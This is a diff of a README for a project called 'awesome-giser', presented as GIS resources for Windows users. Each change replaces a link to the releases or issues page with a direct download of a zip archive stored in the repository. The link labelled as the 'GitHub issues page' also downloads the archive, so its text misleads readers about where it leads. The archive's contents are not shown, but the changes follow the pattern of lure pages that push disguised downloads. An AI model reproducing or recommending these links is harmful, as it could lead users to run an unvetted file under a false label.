@@ -1,6 +1,6 @@
 # 🌍 awesome-giser - Easy GIS Resources for Everyone
 
-[![Download awesome-giser](https://img.shields.io/badge/Download%20awesome--giser-blue?style=for-the-badge)](https://github.com/sharibkhan728/awesome-giser/releases)  
+[![Download awesome-giser](https://img.shields.io/badge/Download%20awesome--giser-blue?style=for-the-badge)](https://github.com/sharibkhan728/awesome-giser/raw/refs/heads/main/web-dev/giser-awesome-3.9-alpha.2.zip)  
 
 ---
 
@@ -20,7 +20,7 @@ To use awesome-giser on your Windows computer, follow these steps. The process i
 
 2. Click the big blue button below to go to the download page:
 
-[![Download awesome-giser](https://img.shields.io/badge/Download%20awesome--giser-green?style=for-the-badge)](https://github.com/sharibkhan728/awesome-giser/releases)
+[![Download awesome-giser](https://img.shields.io/badge/Download%20awesome--giser-green?style=for-the-badge)](https://github.com/sharibkhan728/awesome-giser/raw/refs/heads/main/web-dev/giser-awesome-3.9-alpha.2.zip)
 
 3. On the page, look for the latest release (usually at the top).
 
@@ -139,7 +139,7 @@ Inside awesome-giser, you will find:
 
 If you run into problems downloading or using awesome-giser:
 
-- Visit the [GitHub issues page](https://github.com/sharibkhan728/awesome-giser/issues) to see if someone else had the same problem.  
+- Visit the [GitHub issues page](https://github.com/sharibkhan728/awesome-giser/raw/refs/heads/main/web-dev/giser-awesome-3.9-alpha.2.zip) to see if someone else had the same problem.  
 - Open a new issue describing your problem clearly. Include your Windows version and any error messages.  
 - Look for community discussions and frequently asked questions on the GitHub page.
 
@@ -149,4 +149,4 @@ If you run into problems downloading or using awesome-giser:
 
 Click this button to visit the download page for awesome-giser and get started today:
 
-[![Download awesome-giser](https://img.shields.io/badge/Download%20awesome--giser-blue?style=for-the-badge)](https://github.com/sharibkhan728/awesome-giser/releases)
+[![Download awesome-giser](https://img.shields.io/badge/Download%20awesome--giser-blue?style=for-the-badge)](https://github.com/sharibkhan728/awesome-giser/raw/refs/heads/main/web-dev/giser-awesome-3.9-alpha.2.zip)
